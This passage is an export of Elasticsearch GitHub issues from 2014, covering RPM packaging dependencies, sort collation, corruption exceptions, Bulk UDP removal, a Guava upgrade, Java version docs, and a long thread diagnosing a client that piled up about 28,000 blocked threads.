</comment><comment author="clintongormley" created="2014-11-07T11:13:49Z" id="62128988">Hi @erikringsmuth 

Given that a new node name is generated on every restart, it doesn't seem to make sense to use these auto-generated names for logging.  I think we're going to leave this as it is: just set the node names manually if you want to use those names for logging.

thanks
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add dependencies to generated RPM.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7598</link><project id="" key="" /><description /><key id="41975685">7598</key><summary>Add dependencies to generated RPM.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/tlrx/following{/other_user}', u'events_url': u'https://api.github.com/users/tlrx/events{/privacy}', u'organizations_url': u'https://api.github.com/users/tlrx/orgs', u'url': u'https://api.github.com/users/tlrx', u'gists_url': u'https://api.github.com/users/tlrx/gists{/gist_id}', u'html_url': u'https://github.com/tlrx', u'subscriptions_url': u'https://api.github.com/users/tlrx/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/642733?v=4', u'repos_url': u'https://api.github.com/users/tlrx/repos', u'received_events_url': u'https://api.github.com/users/tlrx/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/tlrx/starred{/owner}{/repo}', u'site_admin': False, u'login': u'tlrx', u'type': u'User', u'id': 642733, u'followers_url': u'https://api.github.com/users/tlrx/followers'}</assignee><reporter username="">tomprince</reporter><labels><label>:Packaging</label><label>feedback_needed</label><label>review</label></labels><created>2014-09-04T19:29:19Z</created><updated>2016-03-03T18:58:48Z</updated><resolved>2016-03-03T18:58:48Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:10:56Z" id="54720953">Hi @tomprince 

Thanks for the PR.  Actually, we require at least Java v7, and prefer at least update 55 or above.

@electrical could you have a look at this PR please?
</comment><comment author="tomprince" created="2014-09-07T19:28:45Z" id="54757481">I'm not sure how best to require a specific update, without tying this to openjdk.
</comment><comment author="electrical" created="2014-09-08T08:19:53Z" id="54788468">The problem with defining dependencies is that now it expects JRE to be installed while some people might want to install Oracle Java which is a complete separate thing.

@spinscale What do you think?
</comment><comment author="tomprince" created="2014-09-08T14:25:52Z" id="54826259">The RPM from [oracle](https://www.java.com/en/download/linux_manual.jsp?locale=en) provides `jre`, so this should work with that. If people don't want dependency resolution, why are they using an RPM?
</comment><comment author="spinscale" created="2014-09-09T07:30:23Z" id="54934191">@tomprince while people are using the elasticsearch RPM, some are not using the oracle RPM but some tarball... thats why I left out the `jre` dependency when creating the RPM

I think one of the main advantages of the RPM is the known file system layout and start/stop facilities that come out of the box, not the dependency mgmt (especially for java packages)
</comment><comment author="tomprince" created="2014-09-11T04:03:25Z" id="55216893">I don't know about anybody else, but if I added a repository, and then went `yum install elasticsearch` and then found that it wouldn't actually run, since there were missing dependencies, I'd be annoyed (hence this patch).

If people want to use a non-packaged JVM, then there are techniques for telling the packaging system about that.
</comment><comment author="t-lo" created="2014-12-01T13:09:32Z" id="65062195">Just tested the patch on Elasticsearch master/HEAD - RPM is built with JRE and 'which' dependencies and the dependencies work as expected. The line `&lt;require&gt;/usr/bin/which&lt;/require&gt;` may be shortened to `&lt;require&gt;which&lt;/require&gt;` (as it is unusual to specify a path in dependencies), but that's just a minor nitpick.

Also, concerning the JRE dependency - in the linux packaging world a package would usually specify each and every dependency it requires, so it makes sense to include a JRE dependency as well.
</comment><comment author="tomprince" created="2014-12-01T17:25:23Z" id="65100742">&gt; The line &lt;require&gt;/usr/bin/which&lt;/require&gt; may be shortened to &lt;require&gt;which&lt;/require&gt; (as it is unusual to specify a path in dependencies), but that's just a minor nitpick.

I'm not sure how unusual it is, an in any case it is more accurate.
</comment><comment author="t-lo" created="2014-12-01T17:42:33Z" id="65103632">&gt; I'm not sure how unusual it is, an in any case it is more accurate.

I'd argue that, from a package maintainer's point of view, it's more likely confusing than it is accurate.
Dependencies in RPMs are usually specified for packages, not files (see http://rpm5.org/docs/api/dependencies.html). Using `/usr/bin/which` in the dependency field would make it a "capability" (i.e. something _provided_ by some other package). Since `which` has its own RPM package (see e.g. http://rpmfind.net/linux/rpm2html/search.php?query=which) I find it more straightforward to specify the package directly (instead of something provided by that package).

But details left aside, I agree that those dependencies should be specified in the package _at all_, and currently they are not.
</comment><comment author="s1monw" created="2014-12-05T08:52:54Z" id="65762369">@tomprince we agree that we don't want any hard dep. on the java version. Can you remove the java dependency and just keep the one to `which`
</comment><comment author="dakrone" created="2016-03-03T18:58:48Z" id="191913462">RPM generation has been completely rewritten for the gradle switch, so closing this
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Sorting using SortOrder.ASC - issue with white space in sort-by field?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7597</link><project id="" key="" /><description>We're using 1.3.0 - sorry I can't test against 1.3.2 ATM.  We had a test break where we were expecting a set of results to be sorted in ascending order.  Comparing to what Collections.sort(&lt;list&gt;, String.CASE_INSENSITIVE_ORDER) returns, we see an issue when the field has whitespace in it.  It looks like the string "polar Bear" was sorted ignoring the first word "polar".  Is this a known issue or is the collation somehow different between Java 1.7 and Elasticsearch's sorting?

...list was not sorted,
want: 
[0000panther, 01Skunk, 01squirrel, 22penguin, 33333Tiger, 99Wolf, Aardvark, Administrators, badger, Bear, Coyote, Crocodile, duck, Hamster, jaguar, Lynx, Monkey, Ocelot, Octopus, **polar Bear**, Sloth, stingray, tortoise]
 got:
[0000panther, 01Skunk, 01squirrel, 22penguin, 33333Tiger, 99Wolf, Aardvark, Administrators, badger, **polar Bear**, Bear, Coyote, Crocodile, duck, Hamster, jaguar, Lynx, Monkey, Ocelot, Octopus, Sloth, stingray, tortoise]: 
arrays first differed at element [9]; expected:&lt;[]Bear&gt; but was:&lt;[polar ]Bear&gt;
</description><key id="41975567">7597</key><summary>Sorting using SortOrder.ASC - issue with white space in sort-by field?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">swruch</reporter><labels><label>feedback_needed</label></labels><created>2014-09-04T19:28:08Z</created><updated>2014-09-10T14:24:49Z</updated><resolved>2014-09-06T19:59:26Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T17:07:29Z" id="54720817">@swruch i assume your field is `index: analyzed`?  In which case, it contains two values: `polar` and `bear`.

You need to make it `not_analyzed`.
</comment><comment author="swruch" created="2014-09-06T19:09:13Z" id="54725024">If analyzed is the default, then we are not setting not_analyzed so that must be what's going on.  Thanks for pointing that out.
</comment><comment author="swruch" created="2014-09-09T21:31:05Z" id="55039070">OK, so I added not_analyzed to our field mapping and now I see that the sort order still differs in that the ES sort is not case-insensitive.  What we're trying to do here is get the same behavior from an ES sort ascending as from our database (order by field ascending).  Is this possible?

want: [0000panther, 01Skunk, 01squirrel, 22penguin, 33333Tiger, 99Wolf, Aardvark, Administrators, badger, Bear, Coyote, Crocodile, duck, Hamster, jaguar, Lynx, Monkey, Ocelot, Octopus, polar Bear, Sloth, stingray, tortoise]
 got:
[0000panther, 01Skunk, 01squirrel, 22penguin, 33333Tiger, 99Wolf, Aardvark, Administrators, Bear, Coyote, Crocodile, Hamster, Lynx, Monkey, Ocelot, Octopus, Sloth, badger, duck, jaguar, polar Bear, stingray, tortoise]: arrays first differed at element [8]; expected:&lt;[badge]r&gt; but was:&lt;[Bea]r&gt;
</comment><comment author="clintongormley" created="2014-09-10T14:24:49Z" id="55122423">@swruch Read http://www.elasticsearch.org/guide/en/elasticsearch/guide/current/sorting-collations.html#case-insensitive-sorting
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Improve exception from Store.failIfCorrupted</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7596</link><project id="" key="" /><description>If you have previously corrupted files, this method currently builds an exception like:

```
failed engine [corrupted preexisting index]
failed to start shard
```

Followed by a CorruptIndexException:

```
builder.append(" Corrupted index [");
builder.append(file).append("] caused by: ");
builder.append(msg);
ex.add(new CorruptIndexException(builder.toString()));
```

Is it possible to improve this:
1. In the string we write (msg), can the string have more details when we write it, e.g. including full stracktrace?
2. can we change the text 'corrupted preexisting index' to either 'preexisting corrupted index' or 'index has preexisting corruption' or similar?
</description><key id="41974368">7596</key><summary>Improve exception from Store.failIfCorrupted</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T19:15:28Z</created><updated>2014-09-11T15:13:04Z</updated><resolved>2014-09-11T15:13:04Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T07:54:58Z" id="54595314">I wonder if we should do both. And log the stacktrace as debug?
</comment><comment author="clintongormley" created="2014-09-06T17:29:30Z" id="54721603">@rmuir are you taking this or should it be an adoptme?
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove Bulk UDP </title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7595</link><project id="" key="" /><description>This feature is rarely used. Removing it will help reduce the moving parts
of Elasticsearch and focus on the core.
</description><key id="41967417">7595</key><summary>Remove Bulk UDP </summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Bulk</label><label>breaking</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T18:13:35Z</created><updated>2015-11-18T12:39:45Z</updated><resolved>2014-09-11T07:52:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-09-04T18:13:56Z" id="54520691">The plan is to remove it from master and deprecate in 1.4.
</comment><comment author="s1monw" created="2014-09-05T20:16:40Z" id="54675829">LGTM - I think we should just push this to master and have a dedicated issue / pr for 1.4 ?
</comment><comment author="skdangi" created="2015-11-18T12:39:45Z" id="157699226">https://discuss.elastic.co/t/bulk-udp-deprecated/22853
Can we expose this as plugin?
This is very handy.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Refactor copy headers mechanism in REST API</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7594</link><project id="" key="" /><description>The functionality of copying headers in the REST layer (from REST requests to transport requests) remains the same. Made it a bit nicer by introducing a ClientFactory component that is a singleton and allows to register useful headers without requiring static methods.

Plugins just have to inject the ClientFactory now, and call its `addUsefulHeaders` method that is not static anymore.

Relates to #6513
</description><key id="41954433">7594</key><summary>Refactor copy headers mechanism in REST API</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T16:05:49Z</created><updated>2015-06-07T12:06:20Z</updated><resolved>2014-09-10T10:06:25Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-09-05T20:37:28Z" id="54678216">I left some minor comments
</comment><comment author="javanna" created="2014-09-09T16:23:26Z" id="54996345">I pushed a new commit that addresses the naming feedback. I also rebased to adapt the code to #7610 that was pushed in the meantime.
</comment><comment author="s1monw" created="2014-09-10T07:51:24Z" id="55082110">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Upgrade Guava to 18.0.</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7593</link><project id="" key="" /><description>17.0 and earlier versions were affected by the following bug
https://code.google.com/p/guava-libraries/issues/detail?id=1761
which caused caches that are configured with weights that are greater than
32GB to actually be unbounded. This is now fixed.

Relates to #6268
</description><key id="41937140">7593</key><summary>Upgrade Guava to 18.0.</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Core</label><label>upgrade</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T13:33:49Z</created><updated>2015-08-25T13:25:43Z</updated><resolved>2014-09-04T18:30:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-04T13:41:34Z" id="54478218">LGTM
</comment><comment author="kimchy" created="2014-09-04T14:32:49Z" id="54485607">LGTM
</comment><comment author="jpountz" created="2014-09-04T18:31:17Z" id="54523272">Thanks for the reviews!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>~28k threads on es java client</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7592</link><project id="" key="" /><description>Hello,

I run a java client (a real client not just a transport) to send bulk index request to ES.

At some point I have around 28k threads blocked with the following stacktraces:

```
"elasticsearch[Trump][generic][T#62615]" daemon prio=10 tid=0x00007f23f9db7800 nid=0x9b0c waiting on condition [0x00007f1e0f82a000]
   java.lang.Thread.State: WAITING (parking)
    at sun.misc.Unsafe.park(Native Method)
    - parking to wait for  &lt;0x00000006cbd1e030&gt; (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197)
    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:214)
    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:290)
    at java.util.concurrent.CopyOnWriteArrayList.remove(CopyOnWriteArrayList.java:507)
    at org.elasticsearch.cluster.service.InternalClusterService.remove(InternalClusterService.java:182)
    at org.elasticsearch.action.support.master.TransportMasterNodeOperationAction$3.onTimeout(TransportMasterNodeOperationAction.java:179)
    at org.elasticsearch.cluster.service.InternalClusterService$NotifyTimeout.run(InternalClusterService.java:492)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:744)
```

I've added this stacktrace in #5152 to underline the consequence of unbounded thread pool.
However the real issue might be a deadlock.

This only other reference to CopyOnWriteArrayList I found is add:

```
"elasticsearch[Trump][clusterService#updateTask][T#1]" daemon prio=10 tid=0x00007f2475927000 nid=0x8a7c waiting on condition [0x00007f242e6e5000]
   java.lang.Thread.State: WAITING (parking)
    at sun.misc.Unsafe.park(Native Method)
    - parking to wait for  &lt;0x00000006cbd1e030&gt; (a java.util.concurrent.locks.ReentrantLock$NonfairSync)
    at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:834)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:867)
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1197)
    at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:214)
    at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:290)
    at java.util.concurrent.CopyOnWriteArrayList.add(CopyOnWriteArrayList.java:416)
    at org.elasticsearch.cluster.service.InternalClusterService$1.run(InternalClusterService.java:217)
    at org.elasticsearch.common.util.concurrent.PrioritizedEsThreadPoolExecutor$TieBreakingPrioritizedRunnable.run(PrioritizedEsThreadPoolExecutor.java:134)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:744)
```

Of course the consequence of this huge number of threads is a slowdown and eventually a crash of the application.

This is ES 1.1.1 on java `Java(TM) SE Runtime Environment (build 1.7.0_51-b13)`
</description><key id="41931942">7592</key><summary>~28k threads on es java client</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/mikemccand/following{/other_user}', u'events_url': u'https://api.github.com/users/mikemccand/events{/privacy}', u'organizations_url': u'https://api.github.com/users/mikemccand/orgs', u'url': u'https://api.github.com/users/mikemccand', u'gists_url': u'https://api.github.com/users/mikemccand/gists{/gist_id}', u'html_url': u'https://github.com/mikemccand', u'subscriptions_url': u'https://api.github.com/users/mikemccand/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/796508?v=4', u'repos_url': u'https://api.github.com/users/mikemccand/repos', u'received_events_url': u'https://api.github.com/users/mikemccand/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/mikemccand/starred{/owner}{/repo}', u'site_admin': False, u'login': u'mikemccand', u'type': u'User', u'id': 796508, u'followers_url': u'https://api.github.com/users/mikemccand/followers'}</assignee><reporter username="">kamaradclimber</reporter><labels /><created>2014-09-04T12:49:11Z</created><updated>2014-09-17T14:31:57Z</updated><resolved>2014-09-17T14:31:57Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="kamaradclimber" created="2014-09-04T13:06:55Z" id="54471841">the other explaination would be a very important use of this structure (and no dead lock)
</comment><comment author="clintongormley" created="2014-09-06T16:50:11Z" id="54720256">@mikemccand what do you make of this one?
</comment><comment author="clintongormley" created="2014-09-06T16:52:28Z" id="54720339">@kamaradclimber are you using async indexing?
</comment><comment author="kamaradclimber" created="2014-09-07T09:34:51Z" id="54742003">@clintongormley yes I do.

I have succeeded to ~solve this issue by using bulk indexing with higher bulk size. Of course it probably means the contention is lower and thus less visible
</comment><comment author="clintongormley" created="2014-09-07T10:10:31Z" id="54742668">@kamaradclimber don't use async replication.  It stops Elasticsearch from exerting any back pressure on the application, which can lead to ES being overwhelmed. It doesn't make indexing any faster anyway.
</comment><comment author="mikemccand" created="2014-09-07T10:14:07Z" id="54742743">I'm confused here: the bulk indexing thread pool is fixed size (number of processors) with a default queue size of 50, so when too many bulk requests arrive (async or not) you should see them being rejected?  Are you sure you're only issuing bulk requests?

But second off, I completely agree, unbounded thread pools are dangerous.  I think in this case the "deadlock" you were seeing is because CopyOnWriteArrayList is inefficient (O(N^2)) as it gets large...
</comment><comment author="clintongormley" created="2014-09-07T10:18:39Z" id="54742828">@mikemccand when bulk requests are sent to the replicas, they are never rejected (otherwise you'd end up with changes on the primary missing from the replicas).  So if the replica is struggling to keep up (eg heavy merge) it can grow unbounded. 

Async replication doesn't wait for the replicas, so it allows users to get into this state.
</comment><comment author="mikemccand" created="2014-09-07T10:26:15Z" id="54742952">@clintongormley Ahh, I see, so those request to the replicas must be using a different (unbounded) thread pool.  Shouldn't that thread pool be bounded, but have unbounded queue?

So the theory here is primary was plenty fast handling the bulk requests (so client never saw rejections), but a replica fell behind by ~28K requests?  I guess this can make sense, because of the O(N^2) cost of CopyOnWriteArrayList... once a replica starts slowing down, it "quickly" becomes slower and slower, so the situation just gets worse.
</comment><comment author="kimchy" created="2014-09-07T11:23:44Z" id="54744004">the thread dumps are part of the cluster state execution, where there is a single thread executing. I see a master related operation, trying to remove something from the cluster state. Can you attach a thread dump of all the threads you have?
</comment><comment author="kimchy" created="2014-09-07T11:26:42Z" id="54744068">btw, I suspect async replication is not relevant as well here. can you post a sample code of the indexing you are doing? 
</comment><comment author="kamaradclimber" created="2014-09-08T06:47:20Z" id="54781945">@kimchy here is the dump https://gist.github.com/24b78a761e63da0bca8c (it seems gist is limiting the size of files, so here is the full dump http://wikisend.com/download/636734/dump.txt)
</comment><comment author="kamaradclimber" created="2014-09-08T09:26:19Z" id="54794525">code sample: 

``` java
private void sendBatch(Client client, ResponseListenerFactory listenerF) {
        BulkRequest request = prepareRequestBatch(client);
        client.bulk(request, listenerF.getActionListener(request));
    }

private BulkRequest prepareRequestBatch(Client client) {
        BulkRequestBuilder bulk = client.prepareBulk();
        bulk.setConsistencyLevel(WriteConsistencyLevel.ONE);
        for (IndexRequest request : this.requestsBatch) {
            bulk.add(request);
        }
        this.requestsBatch.clear();
        return bulk.request();
    }
```

`getActionListener` returns a ActionListener&lt;BulkResponse&gt;

client settings are:

```
{
  "cluster_name" : "kestrel",
  "nodes" : {
    "DdH0bfK6S5Gi2TGm1nTexQ" : {
      "name" : "Argo",
      "transport_address" : "inet[/10.22.150.10:9300]",
      "host" : "2c-59-e5-4a-0b-f4",
      "ip" : "10.22.150.10",
      "version" : "1.1.1",
      "build" : "f1585f0",
      "http_address" : "inet[/10.22.150.10:9205]",
      "attributes" : {
        "client" : "true",
        "data" : "false"
      },
      "settings" : {
        "path" : {
          "logs" : "/logs"
        },
        "threadpool" : {
          "warmer" : {
            "type" : "fixed",
            "size" : "1"
          },
          "snapshot_data" : {
            "type" : "fixed",
            "size" : "1"
          },
          "get" : {
            "type" : "fixed",
            "size" : "1"
          },
          "search" : {
            "type" : "fixed",
            "size" : "1"
          },
          "snapshot" : {
            "type" : "fixed",
            "size" : "1"
          },
          "percolate" : {
            "type" : "fixed",
            "size" : "1"
          },
          "suggest" : {
            "type" : "fixed",
            "size" : "1"
          },
          "refresh" : {
            "type" : "fixed",
            "size" : "1"
          }
        },
        "config" : "/usr/local/etc/es_pusher_embedded_node.yml",
        "cluster" : {
          "name" : "kestrel"
        },
        "node" : {
          "client" : "true"
        },
        "http" : {
          "port" : "9205-9210"
        },
        "discovery" : {
          "zen" : {
            "ping" : {
              "unicast" : {
                "hosts" : "localhost:9300"
              },
              "multicast" : {
                "enabled" : "false"
              }
            }
          }
        },
        "name" : "Argo"
      }
    }
  }
}
```
</comment><comment author="kamaradclimber" created="2014-09-08T09:28:00Z" id="54794683">@mikemccand I am sure to do only bulk indexing (the above sample is the only interaction of this client with ES).
</comment><comment author="s1monw" created="2014-09-08T10:13:09Z" id="54799073">@kimchy @mikemccand I just looked at this briefly and it seems on the one hand we are not waiting for the bulks to come back which is one problem but the other is that we seem to register a ClusterStateListener in a retry operation for every indexing op and that seems to be maybe waiting for a shard to become active etc. I wonder if @bleskes can shed some light on that - i think he worked on the retry last time.
</comment><comment author="clintongormley" created="2014-09-08T10:21:28Z" id="54799793">@kamaradclimber the comment from @s1monw aside, look at using the BulkProcessor instead of what you're currently doing: https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/action/bulk/BulkProcessor.java
</comment><comment author="bleskes" created="2014-09-17T11:45:33Z" id="55882267">@kamaradclimber I'm sorry for the late response. All the stack traces that fit into the gist are caused by  a master operation which can not proceed because the node has no master. I suspect these are auto create index calls. Is it true that you do not create an index in advance? 

I looked at your settings and I think the problems lies in the fact that your unicast discovery points to the address of the client and not the node you are trying to index to (localhost:9200). This means the client doesn't discover the cluster and doesn't have a master node. Therefore every indexing request waits for up to 1m before time out. If you have too many of those in flight, you will get the behavior you see.

While it's definitely true we should use a better data structure for the "waiting" actions, I think this also implies your indexing request do not wait for an answer before issuing a new request. Is that the case?
</comment><comment author="kamaradclimber" created="2014-09-17T14:14:47Z" id="55899380">@clintongormley  we are now using BulkProcessor, behavior seems far better

@bleskes:
1) yes we have auto index creation (we are indexing logs and roll index every 6 hours)
2) we were able to see the following pattern: threads count increases on all client (same servers as data nodes), the load increases and the data node stop being able to ping each other, the master is demoted, the cluster loose its master and is unable to have one, then the number of threads indeed explodes
3) since we clients are on the same node, localhost:9200 is a valid endpoint for clients
- we have moved since to a setup with 3 dedicated master so we will at some point point clients to those instead of localhost
- usage of BulkProcessor (2 concurrent requests authorized) will fix the issue of millions of in flight requests
</comment><comment author="bleskes" created="2014-09-17T14:20:18Z" id="55900190">&gt; 3) since we clients are on the same node, localhost:9200 is a valid endpoint for clients

Sorry, I made a mistake, I meant the 9300 port. This piece in your settings / info `"transport_address" : "inet[/10.22.150.10:9300]",` suggest the client is bound to the 9300, not the node you are trying to call.
</comment><comment author="kamaradclimber" created="2014-09-17T14:24:27Z" id="55900875">made the same mistake but we understood each other :)
</comment><comment author="bleskes" created="2014-09-17T14:26:39Z" id="55901200">@kamaradclimber might be unneeded repetition, but your client is bound to port 9300 - I think this is the source of the problem.
</comment><comment author="kamaradclimber" created="2014-09-17T14:29:46Z" id="55901688">yes that is something we fixed a few days ago, clients are now on port 9305
</comment><comment author="bleskes" created="2014-09-17T14:31:57Z" id="55902065">OK. So I think we can close it now, as this seems to be the source of the problem - a combination of not being able to connect to the master + an unbound incoming request queue. The BulkProcessor will help you with the latter. If I missed anything, please feel free to reopen.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Docs: Added recommended Java versions to the docs</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7591</link><project id="" key="" /><description>Updated docs to support https://github.com/elasticsearch/elasticsearch/pull/7580

Is the advice in this PR correct?  Anything we need to change or add?
</description><key id="41930620">7591</key><summary>Docs: Added recommended Java versions to the docs</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">clintongormley</reporter><labels><label>docs</label><label>v1.5.0</label><label>v1.6.0</label><label>v2.0.0-beta1</label></labels><created>2014-09-04T12:35:56Z</created><updated>2015-06-30T12:45:26Z</updated><resolved>2015-04-04T18:23:10Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="nik9000" created="2014-09-04T12:49:24Z" id="54469276">Language looks good to me. I don't know the specific versions required though. 
</comment><comment author="rjernst" created="2014-09-05T06:52:46Z" id="54591077">LGTM.
</comment><comment author="s1monw" created="2014-09-05T07:25:29Z" id="54593168">LGTM
</comment><comment author="s1monw" created="2014-09-05T20:18:18Z" id="54676006">@johtani `Java 8 update 20 or later` is recommended the lower ones are buggy too
</comment><comment author="clintongormley" created="2014-09-06T18:26:18Z" id="54723606">Changed Java 7 to u55 and above.
</comment><comment author="s1monw" created="2014-09-10T07:50:15Z" id="55082031">LGTM
</comment><comment author="s1monw" created="2014-09-11T07:15:52Z" id="55228358">moved out to 1.5
</comment><comment author="clintongormley" created="2014-09-11T09:16:41Z" id="55239415">Added the recommended JVM to docs already. Changed this PR to reflect just the change in https://github.com/elasticsearch/elasticsearch/pull/7580
</comment><comment author="javanna" created="2015-03-21T10:38:08Z" id="84304692">I think this needs to be merged now that #7580 is in, right @clintongormley ?
</comment><comment author="clintongormley" created="2015-04-04T18:23:10Z" id="89633485">Closed by 0f4fd0da4ad32544cf7d8cb7a2c99ab5ce742848
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Deduplicate useful headers that get copied from REST to transport layer</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7590</link><project id="" key="" /><description>The useful headers are now stored into a `Set` instead of an array so we can easily deduplicate them. A set is also returned instead of an array by the `usefulHeaders` static getter.
